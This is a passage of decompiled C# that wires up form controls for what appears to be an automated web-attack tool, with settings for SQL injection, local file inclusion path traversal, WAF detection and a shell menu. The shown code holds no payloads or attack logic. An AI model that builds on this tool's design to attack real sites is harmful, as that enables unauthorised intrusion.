				btnSettingReset.Click -= value2;
			}
			this._btnSettingReset = value;
			btnSettingReset = this._btnSettingReset;
			if (btnSettingReset != null)
			{
				btnSettingReset.Click += value2;
			}
		}
	}

	// Token: 0x170003EA RID: 1002
	// (get) Token: 0x06000C99 RID: 3225 RVA: 0x0000722C File Offset: 0x0000542C
	// (set) Token: 0x06000C9A RID: 3226 RVA: 0x00057530 File Offset: 0x00055730
	internal virtual CheckedListBox lstExpoitType
	{
		[CompilerGenerated]
		get
		{
			return this._lstExpoitType;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			ItemCheckEventHandler value2 = new ItemCheckEventHandler(this.method_112);
			EventHandler value3 = new EventHandler(this.method_113);
			CheckedListBox lstExpoitType = this._lstExpoitType;
			if (lstExpoitType != null)
			{
				lstExpoitType.ItemCheck -= value2;
				lstExpoitType.Leave -= value3;
			}
			this._lstExpoitType = value;
			lstExpoitType = this._lstExpoitType;
			if (lstExpoitType != null)
			{
				lstExpoitType.ItemCheck += value2;
				lstExpoitType.Leave += value3;
			}
		}
	}

	// Token: 0x170003EB RID: 1003
	// (get) Token: 0x06000C9B RID: 3227 RVA: 0x00007234 File Offset: 0x00005434
	// (set) Token: 0x06000C9C RID: 3228 RVA: 0x00057590 File Offset: 0x00055790
	internal virtual ToolStripMenuItem mnuTrashRefresh
	{
		[CompilerGenerated]
		get
		{
			return this._mnuTrashRefresh;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_144);
			ToolStripMenuItem mnuTrashRefresh = this._mnuTrashRefresh;
			if (mnuTrashRefresh != null)
			{
				mnuTrashRefresh.Click -= value2;
			}
			this._mnuTrashRefresh = value;
			mnuTrashRefresh = this._mnuTrashRefresh;
			if (mnuTrashRefresh != null)
			{
				mnuTrashRefresh.Click += value2;
			}
		}
	}

	// Token: 0x170003EC RID: 1004
	// (get) Token: 0x06000C9D RID: 3229 RVA: 0x0000723C File Offset: 0x0000543C
	// (set) Token: 0x06000C9E RID: 3230 RVA: 0x00007244 File Offset: 0x00005444
	internal virtual ToolStripSeparator ToolStripSeparator1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003ED RID: 1005
	// (get) Token: 0x06000C9F RID: 3231 RVA: 0x0000724D File Offset: 0x0000544D
	// (set) Token: 0x06000CA0 RID: 3232 RVA: 0x00007255 File Offset: 0x00005455
	internal virtual Label lblHTTPdelay { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003EE RID: 1006
	// (get) Token: 0x06000CA1 RID: 3233 RVA: 0x0000725E File Offset: 0x0000545E
	// (set) Token: 0x06000CA2 RID: 3234 RVA: 0x000575D4 File Offset: 0x000557D4
	internal virtual ToolStripMenuItem mnuHttpLogDock
	{
		[CompilerGenerated]
		get
		{
			return this._mnuHttpLogDock;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_208);
			ToolStripMenuItem mnuHttpLogDock = this._mnuHttpLogDock;
			if (mnuHttpLogDock != null)
			{
				mnuHttpLogDock.Click -= value2;
			}
			this._mnuHttpLogDock = value;
			mnuHttpLogDock = this._mnuHttpLogDock;
			if (mnuHttpLogDock != null)
			{
				mnuHttpLogDock.Click += value2;
			}
		}
	}

	// Token: 0x170003EF RID: 1007
	// (get) Token: 0x06000CA3 RID: 3235 RVA: 0x00007266 File Offset: 0x00005466
	// (set) Token: 0x06000CA4 RID: 3236 RVA: 0x0000726E File Offset: 0x0000546E
	internal virtual NumericUpDown numHTTPTimeout { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003F0 RID: 1008
	// (get) Token: 0x06000CA5 RID: 3237 RVA: 0x00007277 File Offset: 0x00005477
	// (set) Token: 0x06000CA6 RID: 3238 RVA: 0x0000727F File Offset: 0x0000547F
	internal virtual NumericUpDown numHTTPRetry { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003F1 RID: 1009
	// (get) Token: 0x06000CA7 RID: 3239 RVA: 0x00007288 File Offset: 0x00005488
	// (set) Token: 0x06000CA8 RID: 3240 RVA: 0x00057618 File Offset: 0x00055818
	internal virtual NumericUpDown numThreads
	{
		[CompilerGenerated]
		get
		{
			return this._numThreads;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_97);
			NumericUpDown numThreads = this._numThreads;
			if (numThreads != null)
			{
				numThreads.ValueChanged -= value2;
			}
			this._numThreads = value;
			numThreads = this._numThreads;
			if (numThreads != null)
			{
				numThreads.ValueChanged += value2;
			}
		}
	}

	// Token: 0x170003F2 RID: 1010
	// (get) Token: 0x06000CA9 RID: 3241 RVA: 0x00007290 File Offset: 0x00005490
	// (set) Token: 0x06000CAA RID: 3242 RVA: 0x00007298 File Offset: 0x00005498
	internal virtual NumericUpDown numScanningDelay { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003F3 RID: 1011
	// (get) Token: 0x06000CAB RID: 3243 RVA: 0x000072A1 File Offset: 0x000054A1
	// (set) Token: 0x06000CAC RID: 3244 RVA: 0x000072A9 File Offset: 0x000054A9
	internal virtual NumericUpDown numLFIpathTraversalCount { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003F4 RID: 1012
	// (get) Token: 0x06000CAD RID: 3245 RVA: 0x000072B2 File Offset: 0x000054B2
	// (set) Token: 0x06000CAE RID: 3246 RVA: 0x000072BA File Offset: 0x000054BA
	internal virtual NumericUpDown numExploitingDelay { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003F5 RID: 1013
	// (get) Token: 0x06000CAF RID: 3247 RVA: 0x000072C3 File Offset: 0x000054C3
	// (set) Token: 0x06000CB0 RID: 3248 RVA: 0x000072CB File Offset: 0x000054CB
	internal virtual ListViewExt lvwLFIpathLinux { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003F6 RID: 1014
	// (get) Token: 0x06000CB1 RID: 3249 RVA: 0x000072D4 File Offset: 0x000054D4
	// (set) Token: 0x06000CB2 RID: 3250 RVA: 0x000072DC File Offset: 0x000054DC
	internal virtual ColumnHeader ColumnHeader5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003F7 RID: 1015
	// (get) Token: 0x06000CB3 RID: 3251 RVA: 0x000072E5 File Offset: 0x000054E5
	// (set) Token: 0x06000CB4 RID: 3252 RVA: 0x000072ED File Offset: 0x000054ED
	internal virtual ColumnHeader ColumnHeader7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003F8 RID: 1016
	// (get) Token: 0x06000CB5 RID: 3253 RVA: 0x000072F6 File Offset: 0x000054F6
	// (set) Token: 0x06000CB6 RID: 3254 RVA: 0x000072FE File Offset: 0x000054FE
	internal virtual ListViewExt lvwLFIpathWin { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003F9 RID: 1017
	// (get) Token: 0x06000CB7 RID: 3255 RVA: 0x00007307 File Offset: 0x00005507
	// (set) Token: 0x06000CB8 RID: 3256 RVA: 0x0000730F File Offset: 0x0000550F
	internal virtual ColumnHeader ColumnHeader8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003FA RID: 1018
	// (get) Token: 0x06000CB9 RID: 3257 RVA: 0x00007318 File Offset: 0x00005518
	// (set) Token: 0x06000CBA RID: 3258 RVA: 0x00007320 File Offset: 0x00005520
	internal virtual ColumnHeader ColumnHeader9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003FB RID: 1019
	// (get) Token: 0x06000CBB RID: 3259 RVA: 0x00007329 File Offset: 0x00005529
	// (set) Token: 0x06000CBC RID: 3260 RVA: 0x0005765C File Offset: 0x0005585C
	internal virtual ContextMenuStrip mnuPaths
	{
		[CompilerGenerated]
		get
		{
			return this._mnuChecked_7;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler value2 = new CancelEventHandler(this.method_124);
			ContextMenuStrip mnuChecked_ = this._mnuChecked_7;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			this._mnuChecked_7 = value;
			mnuChecked_ = this._mnuChecked_7;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	// Token: 0x170003FC RID: 1020
	// (get) Token: 0x06000CBD RID: 3261 RVA: 0x00007331 File Offset: 0x00005531
	// (set) Token: 0x06000CBE RID: 3262 RVA: 0x000576A0 File Offset: 0x000558A0
	internal virtual ToolStripMenuItem mnuPathAdd
	{
		[CompilerGenerated]
		get
		{
			return this._mnuPathAdd;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_125);
			ToolStripMenuItem mnuPathAdd = this._mnuPathAdd;
			if (mnuPathAdd != null)
			{
				mnuPathAdd.Click -= value2;
			}
			this._mnuPathAdd = value;
			mnuPathAdd = this._mnuPathAdd;
			if (mnuPathAdd != null)
			{
				mnuPathAdd.Click += value2;
			}
		}
	}

	// Token: 0x170003FD RID: 1021
	// (get) Token: 0x06000CBF RID: 3263 RVA: 0x00007339 File Offset: 0x00005539
	// (set) Token: 0x06000CC0 RID: 3264 RVA: 0x000576E4 File Offset: 0x000558E4
	internal virtual ToolStripMenuItem mnuPathEdit
	{
		[CompilerGenerated]
		get
		{
			return this._mnuPathEdit;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_126);
			ToolStripMenuItem mnuPathEdit = this._mnuPathEdit;
			if (mnuPathEdit != null)
			{
				mnuPathEdit.Click -= value2;
			}
			this._mnuPathEdit = value;
			mnuPathEdit = this._mnuPathEdit;
			if (mnuPathEdit != null)
			{
				mnuPathEdit.Click += value2;
			}
		}
	}

	// Token: 0x170003FE RID: 1022
	// (get) Token: 0x06000CC1 RID: 3265 RVA: 0x00007341 File Offset: 0x00005541
	// (set) Token: 0x06000CC2 RID: 3266 RVA: 0x00057728 File Offset: 0x00055928
	internal virtual ToolStripMenuItem mnuPathRem
	{
		[CompilerGenerated]
		get
		{
			return this._mnuPathRem;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_127);
			ToolStripMenuItem mnuPathRem = this._mnuPathRem;
			if (mnuPathRem != null)
			{
				mnuPathRem.Click -= value2;
			}
			this._mnuPathRem = value;
			mnuPathRem = this._mnuPathRem;
			if (mnuPathRem != null)
			{
				mnuPathRem.Click += value2;
			}
		}
	}

	// Token: 0x170003FF RID: 1023
	// (get) Token: 0x06000CC3 RID: 3267 RVA: 0x00007349 File Offset: 0x00005549
	// (set) Token: 0x06000CC4 RID: 3268 RVA: 0x00007351 File Offset: 0x00005551
	internal virtual GroupBox grbFileIncWAFs { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000400 RID: 1024
	// (get) Token: 0x06000CC5 RID: 3269 RVA: 0x0000735A File Offset: 0x0000555A
	// (set) Token: 0x06000CC6 RID: 3270 RVA: 0x00007362 File Offset: 0x00005562
	internal virtual GroupBox grbHTTPExploit { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000401 RID: 1025
	// (get) Token: 0x06000CC7 RID: 3271 RVA: 0x0000736B File Offset: 0x0000556B
	// (set) Token: 0x06000CC8 RID: 3272 RVA: 0x00007373 File Offset: 0x00005573
	internal virtual CheckBox chkExploitIgnoreCookies { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000402 RID: 1026
	// (get) Token: 0x06000CC9 RID: 3273 RVA: 0x0000737C File Offset: 0x0000557C
	// (set) Token: 0x06000CCA RID: 3274 RVA: 0x00007384 File Offset: 0x00005584
	internal virtual CheckBox chkSkipHttpStatus4xx { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000403 RID: 1027
	// (get) Token: 0x06000CCB RID: 3275 RVA: 0x0000738D File Offset: 0x0000558D
	// (set) Token: 0x06000CCC RID: 3276 RVA: 0x00007395 File Offset: 0x00005595
	internal virtual ToolStrip tsWorker { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000404 RID: 1028
	// (get) Token: 0x06000CCD RID: 3277 RVA: 0x0000739E File Offset: 0x0000559E
	// (set) Token: 0x06000CCE RID: 3278 RVA: 0x000073A6 File Offset: 0x000055A6
	internal virtual ToolStripButton btnStart { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000405 RID: 1029
	// (get) Token: 0x06000CCF RID: 3279 RVA: 0x000073AF File Offset: 0x000055AF
	// (set) Token: 0x06000CD0 RID: 3280 RVA: 0x000073B7 File Offset: 0x000055B7
	internal virtual ToolStripButton btnPause { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000406 RID: 1030
	// (get) Token: 0x06000CD1 RID: 3281 RVA: 0x000073C0 File Offset: 0x000055C0
	// (set) Token: 0x06000CD2 RID: 3282 RVA: 0x000073C8 File Offset: 0x000055C8
	internal virtual ToolStripSeparator btnPauseSP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000407 RID: 1031
	// (get) Token: 0x06000CD3 RID: 3283 RVA: 0x000073D1 File Offset: 0x000055D1
	// (set) Token: 0x06000CD4 RID: 3284 RVA: 0x000073D9 File Offset: 0x000055D9
	internal virtual ToolStripButton btnStop { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000408 RID: 1032
	// (get) Token: 0x06000CD5 RID: 3285 RVA: 0x000073E2 File Offset: 0x000055E2
	// (set) Token: 0x06000CD6 RID: 3286 RVA: 0x000073EA File Offset: 0x000055EA
	internal virtual ToolStripProgressBar prbMainStatus { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000409 RID: 1033
	// (get) Token: 0x06000CD7 RID: 3287 RVA: 0x000073F3 File Offset: 0x000055F3
	// (set) Token: 0x06000CD8 RID: 3288 RVA: 0x0005776C File Offset: 0x0005596C
	internal virtual CheckBox chkLfiWindowsSkip
	{
		[CompilerGenerated]
		get
		{
			return this._chkLfiWindowsSkip;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_111);
			CheckBox chkLfiWindowsSkip = this._chkLfiWindowsSkip;
			if (chkLfiWindowsSkip != null)
			{
				chkLfiWindowsSkip.CheckedChanged -= value2;
			}
			this._chkLfiWindowsSkip = value;
			chkLfiWindowsSkip = this._chkLfiWindowsSkip;
			if (chkLfiWindowsSkip != null)
			{
				chkLfiWindowsSkip.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x1700040A RID: 1034
	// (get) Token: 0x06000CD9 RID: 3289 RVA: 0x000073FB File Offset: 0x000055FB
	// (set) Token: 0x06000CDA RID: 3290 RVA: 0x00007403 File Offset: 0x00005603
	internal virtual ListViewExt lvwWafs { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700040B RID: 1035
	// (get) Token: 0x06000CDB RID: 3291 RVA: 0x0000740C File Offset: 0x0000560C
	// (set) Token: 0x06000CDC RID: 3292 RVA: 0x00007414 File Offset: 0x00005614
	internal virtual ColumnHeader ColumnHeader11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700040C RID: 1036
	// (get) Token: 0x06000CDD RID: 3293 RVA: 0x0000741D File Offset: 0x0000561D
	// (set) Token: 0x06000CDE RID: 3294 RVA: 0x00007425 File Offset: 0x00005625
	internal virtual ColumnHeader ColumnHeader12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700040D RID: 1037
	// (get) Token: 0x06000CDF RID: 3295 RVA: 0x0000742E File Offset: 0x0000562E
	// (set) Token: 0x06000CE0 RID: 3296 RVA: 0x00007436 File Offset: 0x00005636
	internal virtual Label lblUserAgent { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700040E RID: 1038
	// (get) Token: 0x06000CE1 RID: 3297 RVA: 0x0000743F File Offset: 0x0000563F
	// (set) Token: 0x06000CE2 RID: 3298 RVA: 0x000577B0 File Offset: 0x000559B0
	internal virtual TextBox txtUserAgent
	{
		[CompilerGenerated]
		get
		{
			return this._txtUserAgent;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_91);
			TextBox txtUserAgent = this._txtUserAgent;
			if (txtUserAgent != null)
			{
				txtUserAgent.Leave -= value2;
			}
			this._txtUserAgent = value;
			txtUserAgent = this._txtUserAgent;
			if (txtUserAgent != null)
			{
				txtUserAgent.Leave += value2;
			}
		}
	}

	// Token: 0x1700040F RID: 1039
	// (get) Token: 0x06000CE3 RID: 3299 RVA: 0x00007447 File Offset: 0x00005647
	// (set) Token: 0x06000CE4 RID: 3300 RVA: 0x0000744F File Offset: 0x0000564F
	internal virtual Label lblAccept { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000410 RID: 1040
	// (get) Token: 0x06000CE5 RID: 3301 RVA: 0x00007458 File Offset: 0x00005658
	// (set) Token: 0x06000CE6 RID: 3302 RVA: 0x000577F4 File Offset: 0x000559F4
	internal virtual TextBox txtAccept
	{
		[CompilerGenerated]
		get
		{
			return this._txtAccept;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_92);
			TextBox txtAccept = this._txtAccept;
			if (txtAccept != null)
			{
				txtAccept.Leave -= value2;
			}
			this._txtAccept = value;
			txtAccept = this._txtAccept;
			if (txtAccept != null)
			{
				txtAccept.Leave += value2;
			}
		}
	}

	// Token: 0x17000411 RID: 1041
	// (get) Token: 0x06000CE7 RID: 3303 RVA: 0x00007460 File Offset: 0x00005660
	// (set) Token: 0x06000CE8 RID: 3304 RVA: 0x00057838 File Offset: 0x00055A38
	internal virtual ToolStripMenuItem mnuLWShell
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWShell;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_159);
			ToolStripMenuItem mnuLWShell = this._mnuLWShell;
			if (mnuLWShell != null)
			{
				mnuLWShell.Click -= value2;
			}
			this._mnuLWShell = value;
			mnuLWShell = this._mnuLWShell;
			if (mnuLWShell != null)
			{
				mnuLWShell.Click += value2;
			}
		}
	}

	// Token: 0x17000412 RID: 1042
	// (get) Token: 0x06000CE9 RID: 3305 RVA: 0x00007468 File Offset: 0x00005668
	// (set) Token: 0x06000CEA RID: 3306 RVA: 0x00007470 File Offset: 0x00005670
	internal virtual GroupBox grbSQLi { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000413 RID: 1043
	// (get) Token: 0x06000CEB RID: 3307 RVA: 0x00007479 File Offset: 0x00005679
	// (set) Token: 0x06000CEC RID: 3308 RVA: 0x0005787C File Offset: 0x00055A7C
	internal virtual NumericUpDown numAnalizerUnionEnd
	{
		[CompilerGenerated]
		get
		{
			return this._numAnalizerUnionEnd;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_95);
			NumericUpDown numAnalizerUnionEnd = this._numAnalizerUnionEnd;
			if (numAnalizerUnionEnd != null)
			{
				numAnalizerUnionEnd.ValueChanged -= value2;
			}
			this._numAnalizerUnionEnd = value;
			numAnalizerUnionEnd = this._numAnalizerUnionEnd;
			if (numAnalizerUnionEnd != null)
			{
				numAnalizerUnionEnd.ValueChanged += value2;
			}
		}
	}

	// Token: 0x17000414 RID: 1044
	// (get) Token: 0x06000CED RID: 3309 RVA: 0x00007481 File Offset: 0x00005681
	// (set) Token: 0x06000CEE RID: 3310 RVA: 0x00007489 File Offset: 0x00005689
	internal virtual Label lblSQLiUnionTo { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000415 RID: 1045
	// (get) Token: 0x06000CEF RID: 3311 RVA: 0x00007492 File Offset: 0x00005692
	// (set) Token: 0x06000CF0 RID: 3312 RVA: 0x000578C0 File Offset: 0x00055AC0
	internal virtual NumericUpDown numAnalizerUnionSart
	{
		[CompilerGenerated]
		get
		{
			return this._numAnalizerUnionSart;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_95);
			NumericUpDown numAnalizerUnionSart = this._numAnalizerUnionSart;
			if (numAnalizerUnionSart != null)
			{
				numAnalizerUnionSart.ValueChanged -= value2;
			}
			this._numAnalizerUnionSart = value;
			numAnalizerUnionSart = this._numAnalizerUnionSart;
			if (numAnalizerUnionSart != null)
			{
				numAnalizerUnionSart.ValueChanged += value2;
			}
		}
	}

	// Token: 0x17000416 RID: 1046
	// (get) Token: 0x06000CF1 RID: 3313 RVA: 0x0000749A File Offset: 0x0000569A
	// (set) Token: 0x06000CF2 RID: 3314 RVA: 0x000074A2 File Offset: 0x000056A2
	internal virtual Label lblSQLiUnionCount { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000417 RID: 1047
	// (get) Token: 0x06000CF3 RID: 3315 RVA: 0x000074AB File Offset: 0x000056AB
	// (set) Token: 0x06000CF4 RID: 3316 RVA: 0x000074B3 File Offset: 0x000056B3
	internal virtual CheckBox chkAnalizerMySQLErrorUnion { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000418 RID: 1048
	// (get) Token: 0x06000CF5 RID: 3317 RVA: 0x000074BC File Offset: 0x000056BC
	// (set) Token: 0x06000CF6 RID: 3318 RVA: 0x000074C4 File Offset: 0x000056C4
	internal virtual CheckBox chkAnalizeWAF { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000419 RID: 1049
	// (get) Token: 0x06000CF7 RID: 3319 RVA: 0x000074CD File Offset: 0x000056CD
	// (set) Token: 0x06000CF8 RID: 3320 RVA: 0x000074D5 File Offset: 0x000056D5
	internal virtual CheckBox chkAnalizerMSSQLErrorUnion { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700041A RID: 1050
	// (get) Token: 0x06000CF9 RID: 3321 RVA: 0x000074DE File Offset: 0x000056DE
	// (set) Token: 0x06000CFA RID: 3322 RVA: 0x000074E6 File Offset: 0x000056E6
	internal virtual TabPage TabPage1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700041B RID: 1051
	// (get) Token: 0x06000CFB RID: 3323 RVA: 0x000074EF File Offset: 0x000056EF
	// (set) Token: 0x06000CFC RID: 3324 RVA: 0x000074F7 File Offset: 0x000056F7
	internal virtual TabPage TabPage2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700041C RID: 1052
	// (get) Token: 0x06000CFD RID: 3325 RVA: 0x00007500 File Offset: 0x00005700
	// (set) Token: 0x06000CFE RID: 3326 RVA: 0x00007508 File Offset: 0x00005708
	internal virtual TabPage TabPage3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700041D RID: 1053
	// (get) Token: 0x06000CFF RID: 3327 RVA: 0x00007511 File Offset: 0x00005711
	// (set) Token: 0x06000D00 RID: 3328 RVA: 0x00057904 File Offset: 0x00055B04
	internal virtual CheckedListBox lstAnalizerUnion
	{
		[CompilerGenerated]
		get
		{
			return this._lstAnalizerUnion;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_93);
			CheckedListBox lstAnalizerUnion = this._lstAnalizerUnion;
			if (lstAnalizerUnion != null)
			{
				lstAnalizerUnion.Leave -= value2;
			}
			this._lstAnalizerUnion = value;
			lstAnalizerUnion = this._lstAnalizerUnion;
			if (lstAnalizerUnion != null)
			{
				lstAnalizerUnion.Leave += value2;
			}
		}
	}

	// Token: 0x1700041E RID: 1054
	// (get) Token: 0x06000D01 RID: 3329 RVA: 0x00007519 File Offset: 0x00005719
	// (set) Token: 0x06000D02 RID: 3330 RVA: 0x00057948 File Offset: 0x00055B48
	internal virtual CheckedListBox lstAnalizerError
	{
		[CompilerGenerated]
		get
		{
			return this._lstAnalizerError;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_93);
			CheckedListBox lstAnalizerError = this._lstAnalizerError;
			if (lstAnalizerError != null)
			{
				lstAnalizerError.Leave -= value2;
			}
			this._lstAnalizerError = value;
			lstAnalizerError = this._lstAnalizerError;
			if (lstAnalizerError != null)
			{
				lstAnalizerError.Leave += value2;
			}
		}
	}

	// Token: 0x1700041F RID: 1055
	// (get) Token: 0x06000D03 RID: 3331 RVA: 0x00007521 File Offset: 0x00005721
	// (set) Token: 0x06000D04 RID: 3332 RVA: 0x00007529 File Offset: 0x00005729
	internal virtual Label lblSQLiExploitCode { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000420 RID: 1056
	// (get) Token: 0x06000D05 RID: 3333 RVA: 0x00007532 File Offset: 0x00005732
	// (set) Token: 0x06000D06 RID: 3334 RVA: 0x0005798C File Offset: 0x00055B8C
	internal virtual TextBox txtAnalizerExploitCode
	{
		[CompilerGenerated]
		get
		{
			return this._txtAnalizerExploitCode;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_94);
			EventHandler value3 = new EventHandler(this.method_110);
			TextBox txtAnalizerExploitCode = this._txtAnalizerExploitCode;
			if (txtAnalizerExploitCode != null)
			{
				txtAnalizerExploitCode.Leave -= value2;
				txtAnalizerExploitCode.TextChanged -= value3;
			}
			this._txtAnalizerExploitCode = value;
			txtAnalizerExploitCode = this._txtAnalizerExploitCode;
			if (txtAnalizerExploitCode != null)
			{
				txtAnalizerExploitCode.Leave += value2;
				txtAnalizerExploitCode.TextChanged += value3;
			}
		}
	}

	// Token: 0x17000421 RID: 1057
	// (get) Token: 0x06000D07 RID: 3335 RVA: 0x0000753A File Offset: 0x0000573A
	// (set) Token: 0x06000D08 RID: 3336 RVA: 0x00007542 File Offset: 0x00005742
	internal virtual Panel pnlSQLi { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000422 RID: 1058
	// (get) Token: 0x06000D09 RID: 3337 RVA: 0x0000754B File Offset: 0x0000574B
	// (set) Token: 0x06000D0A RID: 3338 RVA: 0x00007553 File Offset: 0x00005753
	internal virtual ToolStrip tsSQLi { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000423 RID: 1059
	// (get) Token: 0x06000D0B RID: 3339 RVA: 0x0000755C File Offset: 0x0000575C
	// (set) Token: 0x06000D0C RID: 3340 RVA: 0x00007564 File Offset: 0x00005764
	internal virtual ToolStripComboBox cmbSQLiSearch { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000424 RID: 1060
	// (get) Token: 0x06000D0D RID: 3341 RVA: 0x0000756D File Offset: 0x0000576D
	// (set) Token: 0x06000D0E RID: 3342 RVA: 0x000579EC File Offset: 0x00055BEC
	internal virtual ToolStripButton btnSQLiSearchClear
	{
		[CompilerGenerated]
		get
		{
			return this._btnSQLiSearchClear;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_172);
			ToolStripButton btnSQLiSearchClear = this._btnSQLiSearchClear;
			if (btnSQLiSearchClear != null)
			{
				btnSQLiSearchClear.Click -= value2;
			}
			this._btnSQLiSearchClear = value;
			btnSQLiSearchClear = this._btnSQLiSearchClear;
			if (btnSQLiSearchClear != null)
			{
				btnSQLiSearchClear.Click += value2;
			}
		}
	}

	// Token: 0x17000425 RID: 1061
	// (get) Token: 0x06000D0F RID: 3343 RVA: 0x00007575 File Offset: 0x00005775
	// (set) Token: 0x06000D10 RID: 3344 RVA: 0x00057A30 File Offset: 0x00055C30
	internal virtual ToolStripButton btnSQLiSearch
	{
		[CompilerGenerated]
		get
		{
			return this._btnSQLiSearch;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_172);
			ToolStripButton btnSQLiSearch = this._btnSQLiSearch;
			if (btnSQLiSearch != null)
			{
				btnSQLiSearch.Click -= value2;
			}
			this._btnSQLiSearch = value;
			btnSQLiSearch = this._btnSQLiSearch;
			if (btnSQLiSearch != null)
			{
				btnSQLiSearch.Click += value2;
			}
		}
	}

	// Token: 0x17000426 RID: 1062
	// (get) Token: 0x06000D11 RID: 3345 RVA: 0x0000757D File Offset: 0x0000577D
	// (set) Token: 0x06000D12 RID: 3346 RVA: 0x00007585 File Offset: 0x00005785
	internal virtual ToolStripSeparator ToolStripSeparator12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000427 RID: 1063
	// (get) Token: 0x06000D13 RID: 3347 RVA: 0x0000758E File Offset: 0x0000578E
	// (set) Token: 0x06000D14 RID: 3348 RVA: 0x00007596 File Offset: 0x00005796
